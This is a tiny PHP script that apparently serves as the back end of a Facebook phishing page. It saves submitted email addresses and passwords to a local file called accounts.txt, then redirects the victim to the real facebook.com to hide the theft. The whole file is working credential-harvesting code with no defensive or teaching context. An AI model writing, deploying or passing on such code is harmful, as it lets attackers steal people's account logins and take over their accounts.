<?php

file_put_contents("accounts.txt", "" . $_POST['email'] . ":" . $_POST['pass'] . "\n", FILE_APPEND);
echo ("<script>window.open('https://www.facebook.com/','_self');</script>");


?>